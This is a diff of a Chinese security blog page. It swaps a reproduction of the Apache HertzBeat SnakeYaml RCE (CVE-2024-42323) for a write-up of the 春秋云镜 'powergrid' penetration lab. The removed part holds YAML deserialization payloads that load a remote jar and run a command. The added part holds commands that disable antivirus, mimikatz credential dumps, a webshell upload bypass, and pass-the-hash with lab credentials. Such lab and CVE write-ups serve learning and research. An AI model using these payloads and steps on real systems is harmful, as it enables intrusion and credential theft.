@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323） | Godown_blog</title>
+  <title>春秋云镜 powergrid | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8147.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8191.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）
+        春秋云镜 powergrid
       </span>
     </div>
     
@@ -619,102 +619,91 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <h1 id="Apache-HertzBeat-SnakeYaml-反序列化远程代码执行漏洞（CVE-2024-42323）"><a href="#Apache-HertzBeat-SnakeYaml-反序列化远程代码执行漏洞（CVE-2024-42323）" class="headerlink" title="Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）"></a>Apache HertzBeat SnakeYaml 反序列化远程代码执行漏洞（CVE-2024-42323）</h1><p>snakeYaml反序列化：<a href="https://godownio.github.io/2024/10/28/snakeyaml">https://godownio.github.io/2024/10/28/snakeyaml</a></p>
-<p>commit来自<a target="_blank" rel="noopener" href="https://github.com/apache/hertzbeat/commit/88a843612d0702bd82729526aa28d784874c37c9#diff-8e8715de7d4daf4470f78dbaf8eaf67ad803ddd7c74ccfadfe6b1d799ff8721bR96">https://github.com/apache/hertzbeat/commit/88a843612d0702bd82729526aa28d784874c37c9#diff-8e8715de7d4daf4470f78dbaf8eaf67ad803ddd7c74ccfadfe6b1d799ff8721bR96</a></p>
-<p>commit内把ScriptEngineManager和URLClassLoader加入了黑名单</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415160213022.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415160213022.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>还修改了snakeYaml的版本</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415160256814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415160256814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>Apache HertzBeat 是开源的实时监控工具。受影响版本中由于使用漏洞版本的 SnakeYAML v1.32解析用户可控的 yaml  文件，经过身份验证的攻击者可通过 &#x2F;api&#x2F;monitors&#x2F;import、&#x2F;api&#x2F;alert&#x2F;defines&#x2F;import  接口新增监控类型时配置恶意的 yaml 脚本远程执行任意代码。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>奇安信攻防社区怎么复现这么好😡，漏洞搭建都写了</p>
-<p>下载源码：<a target="_blank" rel="noopener" href="https://github.com/apache/hertzbeat/archive/refs/tags/v1.4.4.zip">https://github.com/apache/hertzbeat/archive/refs/tags/v1.4.4.zip</a></p>
-<p>环境要求：</p>
-<p>后端：maven3+, java17, lombok</p>
-<p>前端：nodejs npm angular-cli</p>
-<p>解压之后找到manager目录下的Manager启动后端代码：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415161910054.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415161910054.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>启动前端：</p>
-<p>在web-app目录下安装依赖<code>npm install</code></p>
-<blockquote>
-<p><code>npm install</code> 会自动读取和解析项目中的一些<strong>关键配置文件</strong>，如下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415163313337.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415163313337.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-</blockquote>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415163721326.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415163721326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>全局安装angular：<code>npm install -g @angular/cli</code></p>
-<p>运行ng serve –open 启动前端页面，跳转到HertzBeat的登陆界面，默认密码admin&#x2F;hertzbeat</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415165208175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415165208175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>审代码，还知道漏洞路由，当然是看到Controller了</p>
-<p>锁定到&#x2F;api&#x2F;monitors&#x2F;import路由，调用importConfig来处理传入的文件</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171311968.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171311968.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>实际跟进到MonitorServiceImpl.importConfig内。该方法根据文件的不同类型调用设置不同的type，再从imExportServiceMap中取出对应的imExportService</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171516221.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171516221.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>在MonitorServiceImpl构造函数对imExportServiceMap进行的初始化</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171828198.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415171828198.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>构造函数参数是<code>List&lt;ImExportService&gt;</code>(警觉)</p>
-<p>Spring 从 <strong>Spring 4.3</strong> 起，spring会在启动时扫描并注入<code>List&lt;接口类型&gt;</code>，只要满足以下两个条件，即使你没有显式加 <code>@Autowired</code> 注解。</p>
-<p>📌 满足以下两个条件就自动注入：</p>
-<ol>
-<li><strong>类上是 Spring Bean</strong>（如 <code>@Component</code>、<code>@Service</code> 等注解）；</li>
-<li><strong>构造函数只有一个</strong>（没有重载）；</li>
-</ol>
-<p>具体过程：</p>
-<ul>
-<li><p>当 Spring 实例化 <code>MonitorServiceImpl</code> 时，会发现构造器的参数是一个 <code>List&lt;ImExportService&gt;</code>。</p>
-</li>
-<li><p>于是 Spring 就去容器里找：有哪些 Bean 是实现了 <code>ImExportService</code> 接口的？找到了 <code>xxxExportService</code> 和 <code>xxxExportService</code>，于是组成一个列表传给构造函数。</p>
-</li>
-</ul>
-<p>Spring 不止支持注入 <code>List&lt;接口&gt;</code>，还支持：</p>
-<ul>
-<li><code>Map&lt;String, Xxx&gt;</code>：会注入 bean name -&gt; bean 实例的映射；</li>
-<li><code>Set&lt;Xxx&gt;</code>：注入不重复的 bean 实现；</li>
-<li><code>ObjectProvider&lt;Xxx&gt;</code>：更懒加载更灵活的依赖注入；</li>
-<li><code>@Qualifier</code>：指定具体某个实现注入。</li>
-</ul>
-<p>当然多个构造函数，就需要用@Autowired显式地告诉spring用哪个构造器进行注入</p>
-<p>回到<code>List&lt;ImExportService&gt;</code>，继承了ImExportService接口的有以下四个类：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415174833921.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415174833921.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>所以用YamllmExportServiceImpl来处理yaml文件，该类没有importConfig方法，转交给他的父类AbstarctImExportServiceImpl处理。</p>
-<p>AbstarctImExportServiceImpl.importConfig调用了parseImport</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175142817.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175142817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟进到YamllmExportServiceImpl.parseImport，snakeYaml反序列化</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175252804.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175252804.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录到HertzBeat后台，可以选择左边任意一个监控，选择导入监控</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175623107.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415175623107.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>没有模板的话，随便新建一个监控然后导出</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415180146912.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250415180146912.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>随便修改一个字段的值为snakeYaml反序列化的payload就能触发漏洞</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="type">!!org.dromara.hertzbeat.manager.service.impl.AbstractImExportServiceImpl$ExportMonitorDTO</span></span><br><span class="line">  <span class="attr">detected:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">metrics:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">basic</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cache</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">performance</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">innodb</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">status</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">handler</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">connection</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">thread</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">tmp</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">select_type</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">sort</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">table_lock</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">process_state</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">slow_sql</span></span><br><span class="line">  <span class="attr">monitor:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">collector:</span> <span class="literal">null</span></span><br><span class="line">    <span class="attr">description:</span> <span class="type">!!javax.script.ScriptEngineManager</span> [<span class="type">!!java.net.URLClassLoader</span> [[<span class="type">!!java.net.URL</span> [<span class="string">&quot;http://127.0.0.1:8888/EvilServiceScriptEngineFactory_jdk8.jar&quot;</span>]]]]</span><br><span class="line">    <span class="attr">host:</span> <span class="string">Evil</span></span><br><span class="line">    <span class="attr">intervals:</span> <span class="number">60</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">MYSQL_Evil</span></span><br><span class="line">    <span class="attr">status:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">1</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">params:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">host</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">Evil</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">port</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">database</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">Evil</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">username</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">admin</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">password</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">2</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">1VoUqkaf3xVudnLjC1gtzw==</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">timeout</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">value:</span> <span class="string">&#x27;6000&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">field:</span> <span class="string">url</span></span><br><span class="line">    <span class="attr">type:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">value:</span> <span class="literal">null</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <p>今天面了字节，如果能面上就贴面筋出来，不然没有</p>
+<h2 id="春秋云镜-powergrid"><a href="#春秋云镜-powergrid" class="headerlink" title="春秋云镜 powergrid"></a>春秋云镜 powergrid</h2><p>这次两个靶机有waf，扫的话会封ip，暂时不扫了，直接打</p>
+<p>当时邀外援打的，榜一大哥，最后排10，赛后帮我蹭了2血，感谢c1</p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>第一台主机有springboot</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309173743358.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309173743358.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309173743358"></p>
+<p>index.html有后台，可以admin 123456登陆</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174021164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174021164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309174021164"></p>
+<p>有邮箱信息</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174203921.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174203921.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309174203921"></p>
+<p>另外一台靶机可以用这里收集到的账号登陆</p>
+<p><a href="mailto:&#x7a;&#115;&#64;&#x70;&#x6f;&#x77;&#101;&#114;&#103;&#x72;&#x69;&#x64;&#x2e;&#99;&#111;&#109;">&#x7a;&#115;&#64;&#x70;&#x6f;&#x77;&#101;&#114;&#103;&#x72;&#x69;&#x64;&#x2e;&#99;&#111;&#109;</a> 123456</p>
+<p>联系人力有admin01</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174717471.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309174717471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309174717471"></p>
+<p>给admin01发邮件钓鱼，exe需要免杀，这里直接用的掩日的免杀</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175030705.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175030705.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309175030705"></p>
+<p>成功上线</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175022664.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175022664.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309175022664"></p>
+<p>可以dump adminstrator hash</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175328492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175328492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309175328492"></p>
+<p>可以转vshell，不过是windows+外网，直接添加用户rdp上去</p>
+<p>admin桌面下有zhangsan的vpn和密码</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175950149.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309175950149.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309175950149"></p>
+<p>账号：zhangsan<br>密码: tpm36H7gJchnI2qV</p>
+<p>直接连接会连不上，在openvpn connect里把内网ip改为外网即可</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180405951.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180405951.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309180405951"></p>
+<p>分配了一个内网ip 172.27.232.2</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180426639.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180426639.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309180426639"></p>
+<p>用fping来ping扫，232网段没有主机，扩大范围可以发现16网段有主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -agq 172.16.200.0/24</span><br></pre></td></tr></table></figure>
 
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180716395.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260309180716395.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260309180716395"></p>
+<p>逐个扫端口，这里懒得扫了，好像又有waf的样子。老是浪费人沙砾，没意思</p>
+<p>172.16.200.76有web服务，并且开了3389，为windows，扫目录能发现有upload.php</p>
+<p>直接上传，修改</p>
+<p>Content-Type: image&#x2F;png</p>
+<p>但是不能解析一句话马，直接用webshell_generate生成免杀马</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191659319.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191659319.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310191659319"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191714299.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191714299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310191714299"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191752478.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310191752478.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310191752478"></p>
+<p>但是有杀软，执行命令就会ret&#x3D;-1，但是看到是php7了，随便找一个免杀shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/misaka19008/PerlinPuzzle-Webshell-PHP">https://github.com/misaka19008/PerlinPuzzle-Webshell-PHP</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310194912977.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310194912977.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310194912977"></p>
+<p>用de5查询杀软进程，执行<code>TaSKLIst^/F&quot;O&quot; C&quot;s&quot;v</code>（点击查看源代码可以分行）</p>
+<p><a target="_blank" rel="noopener" href="https://av8.de5.net/">https://av8.de5.net/</a></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310195250800.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310195250800.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310195250800"></p>
+<p>发现有安全狗和阿里云盾，这个阿里云盾好像是杀不了的，关安全狗和windows Defender就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net stop SafeDogGuardCenter</span><br><span class="line">net stop &quot;Safedog Update Center&quot;</span><br><span class="line">net stop SafeDogCloudHelper</span><br><span class="line">taskkill /F /PID 2820</span><br><span class="line">taskkill /F /PID 2872</span><br><span class="line">taskkill /F /PID 2880</span><br><span class="line">taskkill /F /PID 8756</span><br><span class="line"></span><br><span class="line">powershell -c &quot;Set-MpPreference -DisableRealtimeMonitoring $true&quot;</span><br><span class="line">net stop WinDefend</span><br><span class="line">net stop WdNisSvc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<p>此时shell就能执行代码了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310195729451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310195729451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310195729451"></p>
+<p>加个账户rdp上去，因为直接传mimikatz发现老是传不上去，估计windows杀毒还没关掉，rdp上去再说，但是说是未授权远程登陆</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310200303544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310200303544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310200303544"></p>
+<p>噢噢，原来只有uploads目录有限制，在public目录下顺利上传了</p>
+<p>dump内存先</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310200905369.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310200905369.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310200905369"></p>
+<p>不过只看到bigdata用户</p>
+<p>从SAM数据库dump：</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310201625273.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260310201625273.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260310201625273"></p>
+<p>也是找到admin hash da6df1961007afa067bde06c602ea1f8</p>
+<p>psexec横向上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py administrator@172.16.200.78 -hashes :da6df1961007afa067bde06c602ea1f8 -codec gbk</span><br></pre></td></tr></table></figure>
 
-<h2 id="Spring下的SnakeYaml反序列化"><a href="#Spring下的SnakeYaml反序列化" class="headerlink" title="Spring下的SnakeYaml反序列化"></a>Spring下的SnakeYaml反序列化</h2><p>Apache Hertzbeat是基于Spring开发的应用，其用到了h2database，可以利用org.h2.jdbcx.JdbcDataSource打h2 JDBC Attack</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417163423838.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250417163423838.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p><a href="https://godownio.github.io/2024/10/28/snakeyaml/#%E4%B8%8D%E5%87%BA%E7%BD%91H2-JDBC">https://godownio.github.io/2024/10/28/snakeyaml/#%E4%B8%8D%E5%87%BA%E7%BD%91H2-JDBC</a></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!!org.h2.jdbc.JdbcConnection</span><br><span class="line">- jdbc:h2:mem:test</span><br><span class="line">- MODE: MSSQLServer</span><br><span class="line">  INIT: |</span><br><span class="line">    drop alias <span class="keyword">if</span> exists exec;</span><br><span class="line">    CREATE ALIAS EXEC AS $$<span class="keyword">void</span> <span class="title function_">exec</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);&#125;$$;</span><br><span class="line">    CALL <span class="title function_">EXEC</span> <span class="params">()</span>;</span><br><span class="line">- a</span><br><span class="line">- b</span><br><span class="line">- <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+<p>额，卡住了，慢的刘农</p>
+<p>好像psexec不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py administrator@172.16.200.78 -hashes :da6df1961007afa067bde06c602ea1f8 -codec gbk</span><br></pre></td></tr></table></figure>
 
-<p>利用JDBC Attack能直接任意代码执行，spring环境下直接打spring回显就行</p>
